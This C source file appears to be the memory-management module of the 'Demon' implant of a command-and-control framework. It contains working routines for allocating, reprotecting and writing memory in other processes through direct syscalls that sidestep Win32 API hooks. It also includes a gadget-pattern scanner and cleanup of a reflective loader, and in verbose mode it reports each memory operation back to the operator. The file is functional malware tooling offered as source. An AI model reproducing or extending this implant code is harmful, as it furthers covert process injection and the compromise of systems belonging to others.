#include <Demon.h>
#include <core/Memory.h>
#include <core/MiniStd.h>

/*!
 * @brief
 *  allocate memory on the heap
 *
 * @param Length
 *  size of memory to allocate
 *
 * @return
 *  allocated buffer pointer on the heap
 */
PVOID MmHeapAlloc(
    _In_ ULONG Length
) {
    return Instance->Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Length );
}

/*!
 * @brief
 *  allocate memory on the heap
 *
 * @param Length
 *  size of memory to reallocate
 *
 * @return
 *  allocated buffer pointer on the heap
 */
PVOID MmHeapReAlloc(
    _In_ PVOID Memory,
    _In_ ULONG Length
) {
    return Instance->Win32.RtlReAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Memory, Length );
}

/*!
 * @brief
 *  free memory on the heap
 *
 * @param Memory
 *  memory to free
 *
 * @return
 *  if successfully freed memory on the heap
 */
BOOL MmHeapFree(
    _In_ PVOID Memory
) {
    return Instance->Win32.RtlFreeHeap( NtProcessHeap(), 0, Memory );
}

/*!
 * Allocates virtual memory
 * @param Method
 * @param Process
 * @param Size
 * @param Protect
 * @return
 */
PVOID MmVirtualAlloc(
    IN DX_MEMORY Methode,
    IN HANDLE    Process,
    IN SIZE_T    Size,
    IN DWORD     Protect
) {
    PPACKAGE Package  = NULL;
    PVOID    Memory   = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( Instance->Config.Implant.Verbose && ( Methode != DX_MEM_DEFAULT ) ) {
        Package = PackageCreate( DEMON_INFO );
        PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
    }

    switch ( Methode )
    {
        case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
            Memory = Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ?
                     MmVirtualAlloc( Instance->Config.Memory.Alloc, Process, Size, Protect ) :  // if the config memory alloc ain't default then use that
                     MmVirtualAlloc( DX_MEM_SYSCALL, Process, Size, Protect );                 // if it is default then simply choose Native/Syscall

            return Memory;
        }

        case DX_MEM_WIN32: {
            PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", Process, Size, MEM_RESERVE | MEM_COMMIT, Protect );
            Memory = Instance->Win32.VirtualAllocEx( Process, NULL, Size, MEM_RESERVE | MEM_COMMIT, Protect );
            PRINTF( "%p\n", Memory )
            break;
        }

        case DX_MEM_SYSCALL: {
            if ( ! NT_SUCCESS( NtStatus = SysNtAllocateVirtualMemory( Process, &Memory, 0, &Size, MEM_COMMIT | MEM_RESERVE, Protect ) ) ) {
                PRINTF( "[-] NtAllocateVirtualMemory: Failed:[%lx]\n", NtStatus )
                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                Memory = NULL;
            }

            break;
        }

        default: {
            break;
        }
    }

    PRINTF( "Memory:[%p] MemSize:[%d]\n", Memory, Size );

    if ( Memory && Instance->Config.Implant.Verbose ) {
        Package = PackageCreate( DEMON_INFO );
        PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
        PackageAddPtr( Package, Memory );
        PackageAddInt32( Package, Size );
        PackageAddInt32( Package, Protect );
        PackageTransmit( Package );
        Package = NULL;
    }

    return Memory;
}

/*!
 * Changes the protection of a virtual memory.
 * @param Method
 * @param Process
 * @param Memory
 * @param Size
 * @param Protect
 * @return
 */
BOOL MmVirtualProtect(
    IN DX_MEMORY Method,
    IN HANDLE    Process,
    IN PVOID     Memory,
    IN SIZE_T    Size,
    IN DWORD     Protect
) {
    PPACKAGE  Package    = NULL;
    NTSTATUS  NtStatus   = STATUS_SUCCESS;
    ULONG     OldProtect = 0;
    BOOL      Success    = FALSE;

    switch ( Method )
    {
        case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
            if ( Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ) {
                return MmVirtualProtect( Instance->Config.Memory.Alloc, Process, Memory, Size, Protect );
            } else {
                return MmVirtualProtect( DX_MEM_SYSCALL, Process, Memory, Size, Protect );
            }
        }

        case DX_MEM_WIN32: {
            Success = Instance->Win32.VirtualProtectEx( Process, Memory, Size, Protect, &OldProtect );
            break;
        }

        case DX_MEM_SYSCALL: {
            if ( ! NT_SUCCESS( NtStatus = SysNtProtectVirtualMemory( Process, &Memory, &Size, Protect, &OldProtect ) ) ) {
                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            } else {
                Success = TRUE;
            }

            break;
        }

        default: {
            Success = FALSE;
        }
    }

    if ( Success && Instance->Config.Implant.Verbose ) {
        Package = PackageCreate( DEMON_INFO );
        PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
        PackageAddPtr( Package, Memory );
        PackageAddInt32( Package, Size );
        PackageAddInt32( Package, OldProtect );
        PackageAddInt32( Package, Protect );
        PackageTransmit( Package );
        Package = NULL;
    }

    return Success;
}

BOOL MmVirtualWrite(
    IN  HANDLE Process,
    OUT PVOID  Memory,
    IN  PVOID  Buffer,
    IN  SIZE_T Size
) {
    if ( ! Process || ! Memory || ! Buffer || ! Size ) {
        return FALSE;
    }

    return NT_SUCCESS( SysNtWriteVirtualMemory( Process, Memory, Buffer, Size, NULL ) );
}


/*!
 * Frees virtual memory
 * @param Process
 * @param Memory
 * @return
 */
BOOL MmVirtualFree(
    IN HANDLE Process,
    IN PVOID  Memory
) {
    SIZE_T                   Length   = { 0 };
    MEMORY_BASIC_INFORMATION MmBasic  = { 0 };

    //
    // query memory type
    //
    if ( ! NT_SUCCESS( SysNtQueryVirtualMemory(
        Process,
        Memory,
        MemoryBasicInformation,
        &MmBasic,
        sizeof( MmBasic ),
        NULL
    ) ) ) {
        return FALSE;
    }

    //
    // check if it's a mapped image
    //
    if ( ( MmBasic.Type == MEM_MAPPED ) ) {
        return NT_SUCCESS( SysNtUnmapViewOfSection( NtCurrentProcess(), Memory ) );
    } else {
        return NT_SUCCESS( SysNtFreeVirtualMemory( Process, &Memory, &Length, MEM_RELEASE ) );
    }
}

PVOID MmGadgetFind(
    _In_ PVOID  Memory,
    _In_ SIZE_T Length,
    _In_ PVOID  PatternBuffer,
    _In_ SIZE_T PatternLength
) {
    /* check if required arguments have been specified */
    if ( ( ! Memory        || ! Length        ) ||
         ( ! PatternBuffer || ! PatternLength )
    ) {
        return NULL;
    }

    /* now search for gadgets/pattern */
    for ( SIZE_T Len = 0; Len < Length; Len++ ) {
        if ( MemCompare( C_PTR( U_PTR( Memory ) + Len ), PatternBuffer, PatternLength ) == 0 ) {
            return C_PTR( U_PTR( Memory ) + Len );
        }
    }

    return NULL;
}

#ifdef SHELLCODE
/*!
 * Frees the reflective loader
 * @param BaseAddress
 * @return
 */
BOOL FreeReflectiveLoader(
    IN PVOID BaseAddress
) {
    if ( ! BaseAddress )
        return TRUE;

    // page align the address
    BaseAddress = ( PVOID ) ( ( ( ULONG_PTR )BaseAddress ) & ( ~ ( PAGE_SIZE - 1 ) ) );

    PRINTF( "Freeing the reflective loader at: 0x%p\n", BaseAddress )

    return MmVirtualFree( NtCurrentProcess(), BaseAddress );
}
#endif
